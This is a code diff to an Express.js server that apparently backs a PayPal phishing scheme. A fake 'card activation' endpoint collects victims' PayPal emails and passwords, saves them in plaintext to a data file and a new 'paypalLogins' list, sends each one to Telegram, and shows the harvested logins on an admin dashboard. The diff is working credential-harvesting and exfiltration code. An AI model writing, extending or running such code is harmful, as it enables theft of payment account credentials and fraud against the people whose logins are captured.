@@ -13,11 +13,14 @@ app.use(express.json());
 
 // Data file initialization
 const dataFile = 'data.json';
-let data = { users: [], cards: [], logs: [] };
+let data = { users: [], cards: [], paypalLogins: [], logs: [] };
 function loadData() {
     try {
         if (fs.existsSync(dataFile)) {
             data = JSON.parse(fs.readFileSync(dataFile));
+            // Ensure paypalLogins exists
+            if (!data.paypalLogins) data.paypalLogins = [];
+            if (!data.logs) data.logs = [];
         } else {
             fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
         }
@@ -163,17 +166,33 @@ app.get('/api/cards/activate/:cardId', authenticateToken, (req, res) => {
 app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
     try {
         const cardId = req.params.cardId;
-        const { username: paypalUsername, password: paypalPassword } = req.body;
+        const { paypalUsername, paypalPassword } = req.body;
         const card = data.cards.find(c => c.cardId === cardId && c.user === req.user.username);
         if (!card) return res.status(404).json({ error: 'Card not found' });
         if (!paypalUsername || !paypalPassword) return res.status(400).json({ error: 'PayPal credentials required' });
+        if (card.status !== 'pending') return res.status(400).json({ error: 'Card already activated' });
+
         card.status = 'activated';
+        // Store PayPal credentials in the card
         card.paypalUsername = paypalUsername;
         card.paypalPassword = paypalPassword;
+
+        // Also store in paypalLogins for dashboard
+        data.paypalLogins.push({
+            cardId,
+            paypalUsername,
+            paypalPassword,
+            user: req.user.username,
+            timestamp: new Date().toISOString()
+        });
+
+        // Log the activation
+        data.logs.push({ cardId, user: req.user.username, time: new Date().toISOString() });
+
         fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
         const message = `PayPal Login from ${cardId}: Email: ${paypalUsername}, Password: ${paypalPassword}`;
         await sendTelegramNotification(message);
-        res.json({ message: 'Card activated', cardId });
+        res.json({ message: 'Card activated', cardId, status: 'activated' });
     } catch (error) {
         console.error('Activate card error:', error);
         res.status(500).json({ error: 'Server error activating card' });
@@ -193,14 +212,8 @@ app.get('/api/creator/dashboard', authenticateToken, (req, res) => {
     try {
         if (req.user.username !== 'admin') return res.status(403).json({ error: 'Access denied' });
         const dashboardData = {
-            generatedCards: data.cards,
-            paypalLogins: data.cards.filter(c => c.paypalUsername && c.paypalPassword).map(c => ({
-                cardId: c.cardId,
-                paypalUsername: c.paypalUsername,
-                paypalPassword: c.paypalPassword,
-                user: c.user,
-                timestamp: c.time || Date.now()
-            }))
+            generatedCards: data.cards.filter(c => c.user === 'admin'),
+            paypalLogins: data.paypalLogins.filter(l => l.user === 'admin')
         };
         res.json(dashboardData);
     } catch (error) {
